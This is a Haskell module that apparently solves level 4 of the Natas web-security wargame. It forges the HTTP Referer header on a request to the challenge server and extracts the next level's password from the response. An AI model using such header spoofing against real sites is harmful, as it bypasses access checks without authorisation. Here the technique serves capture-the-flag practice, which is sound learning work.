module Natas.Natas4 where

import           Data.ByteString.Char8     (pack)
import           Safe                      (lastMay)

import           Network.HTTP.Types.Header (hReferer)
import           Network.Wreq              (header)

import           Control.Lens

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  let referer = header hReferer .~ [pack (parentUri 5 ++ "/")]
  req <- accessLevel' 4 (parentUri 4) referer
  let body = reqBody req
      match = workupBody 5 body
  pure $ match >>= lastMay
